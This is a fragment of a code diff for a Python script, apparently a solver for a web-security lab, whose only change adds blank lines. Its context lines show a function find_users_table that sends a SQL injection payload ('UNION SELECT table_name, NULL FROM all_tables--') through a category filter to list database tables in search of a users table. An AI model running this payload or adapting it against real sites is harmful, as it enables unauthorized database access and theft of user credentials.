@@ -3,6 +3,8 @@ import requests
 from bs4 import BeautifulSoup
 import re
 
+
+
 def find_users_table(url):
     try:
         response = requests.get(f"{url}/filter?category=' UNION SELECT table_name, NULL FROM all_tables--")
